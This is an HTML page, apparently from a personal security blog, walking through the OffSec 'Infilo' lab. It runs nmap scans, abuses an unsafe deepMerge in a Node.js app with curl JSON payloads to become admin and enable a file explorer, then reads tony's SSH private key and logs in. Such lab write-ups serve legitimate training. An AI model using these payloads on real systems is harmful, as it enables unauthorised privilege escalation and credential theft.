@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Offensive security writeups, penetration testing labs, and CTF walkthroughs focused on web, network, and privilege escalation techniques.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe writeups, HackTheBox, CTF, cybersecurity, ethical hacking">
+    <meta name="author" content="xlondra">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Pentest Writeups & Security Notes">
+    <meta property="og:description" content="Offensive security lab writeups and CTF walkthroughs.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://xlondra.github.io">
+    <title>Infilo - Offsec - Walktrough</title>
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+    <link rel="stylesheet" href="../../../assets/css/writeup.css">
+    <link rel="stylesheet" href="../../../assets/css/global.css">
+    <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
+
+    <script src="../../../assets/js/nav.js" defer></script>
+    <script src="../../../assets/js/footer.js" defer></script>
+    <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali:~$&nbsp;</span>
+                <span class="typed"></span><span class="cursor">▋</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+                <a href="#" class="nav-exit">exit</a>
+            </div>
+            <div class="hamburger-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor"><path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/></svg></div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="writeup">
+            <div class="lab-header">
+                <h1 class="lab-title">Offsec - Infilo - Walktrough</h1>
+
+                <ul class="lab-meta">
+                    <li><strong>Date:</strong> 19-05-2026</li>
+                    <li><strong>Platform:</strong> Offsec</li>
+                    <li><strong>Difficulty:</strong> Medium</li>
+                    <li><strong>Link:</strong> <a href="https://portal.offsec.com/machine/infilo-212274" target="_blank" rel="noopener noreferrer">Open Lab</a></li>
+                    <li><strong>Tags:</strong>
+                        <span class="tag">prototype pollution</span>
+                        <span class="tag">SSH</span>
+                        <span class="tag">Node.js</span>
+                    </li>
+                </ul>
+            </div>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
+
+                <p>Start by storing the target IP in a variable inside <b>.zshrc</b> for convenience:</p>
+                <img src="images/setIP.png" class="lab-image zoomable">
+                <p>Apply the change to the current session with <b>source</b>, or open a new terminal:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="source ~/.zshrc">└─$ source ~/.zshrc</code></pre>
+                </div>
+
+                <p>Run a full port scan to identify all open services:</p>
+                <img src="images/nmap1.png" class="lab-image zoomable">
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="nmap -p- $IP">└─$ nmap -p- $IP</code></pre>
+                </div>
+
+                <p>The scan reveals three open ports: <b>22</b> (SSH), <b>80</b> (HTTP), and <b>3000</b>. Follow up with a version and script scan to confirm what is running on each:</p>
+                
+                <img src="images/nmap2.png" class="lab-image zoomable">
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="sudo nmap -p22,80,3000 -A $IP">└─$ sudo nmap -p22,80,3000 -A $IP</code></pre>
+                </div>
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
+                <p>Navigating to the target IP in the browser redirects to <b>http://infilo.local:3000/</b>.<br>
+                    Add <b>infilo.local</b> to <b>/etc/hosts</b> to resolve the hostname, then reload the page:
+                </p>
+
+                <img src="images/infilioHome.png" class="lab-image zoomable">
+
+                <p>Clicking <b>Try The Demo</b> reveals a file explorer feature, currently locked:</p>
+                <img src="images/fileExplorerLocked.png" class="lab-image zoomable">
+                <p>The home page offers a download of the application's source code:</p>
+                <img src="images/downloadZip.png" class="lab-image zoomable">
+
+                <p>The lab description flags this application as vulnerable to <b>prototype pollution</b>.<br>
+                    Reviewing the source code with that in mind, the following function stands out as the attack vector:
+                </p>
+                <img src="images/vulnCode.png" class="lab-image zoomable">
+                <p>The <b>deepMerge</b> function iterates over user-supplied keys and, when a value is an object, calls <b>Object.assign</b> on the target, discarding the key entirely and merging the value's contents one level up. There is no filtering of dangerous keys, making it possible to overwrite arbitrary object properties.</p>
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+                <p>By sending a carefully nested payload, the broken merge can be used to overwrite the <b>profile.role</b> property and escalate to admin, then enable the file explorer:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="curl -X POST http://infilo.local:3000/api/profile/update -H &quot;Content-Type: application/json&quot; -d '{&quot;x&quot;: {&quot;profile&quot;: {&quot;role&quot;: &quot;admin&quot;}}}' -c cookies.txt">└─$ curl -X POST http://infilo.local:3000/api/profile/update -H "Content-Type: application/json" -d '{"x": {"profile": {"role": "admin"}}}' -c cookies.txt"</code></pre>
+                </div>
+                <p>The response confirms admin privileges. The session cookie is saved to <b>cookies.txt</b>:</p>
+                <img src="images/cookieValue.png" class="lab-image zoomable">
+                <p>Copy the cookie value and inject it via the browser's developer tools:</p>
+                <img src="images/devToolReplaceCookie.png" class="lab-image zoomable">
+
+                <p>After reloading the page, the session is now authenticated as admin:</p>
+                <img src="images/WhoopWhoopIAmAdmin.png" class="lab-image zoomable">
+                <p>With admin access established, enable the file explorer using the same merge technique against the settings endpoint:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="curl -X POST http://infilo.local:3000/api/settings/update -H &quot;Content-Type: application/json&quot; -b cookies.txt -d '{&quot;x&quot;: {&quot;features&quot;: {&quot;fileExplorer&quot;: true}}}'">└─$ curl -X POST http://infilo.local:3000/api/settings/update -H &quot;Content-Type: application/json&quot; -b cookies.txt -d '{&quot;x&quot;: {&quot;features&quot;: {&quot;fileExplorer&quot;: true}}}'</code></pre>
+                </div>
+
+                <p>The file explorer is now active, exposing the server's filesystem:</p>
+                <img src="images/sshPrivateKey.png" class="lab-image zoomable">
+                <p>The private SSH key for user <b>tony</b> is accessible at <b>/home/tony/.ssh/id_rsa</b>.<br>
+                    Download it and use it to authenticate via SSH:
+                </p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="chmod 600 && ssh tony@$IP -i id_rsa">└─$ chmod 600 && ssh tony@$IP -i id_rsa</code></pre>
+                </div>
+                <p>Access to tony's account is confirmed and the first and only flag is retrieved:</p>
+                <img src="images/firstFlag.png" class="lab-image zoomable">
+
+                <p>That's it. I hope that you, just like me, learned something new today!</p>
+            </section>
+        </article>
+    </main>
+    
+    <footer>
+        Copyleft &copy; <span id="year"></span> &nbsp;·&nbsp; xlondra
+    </footer>
+</body>
+</html>
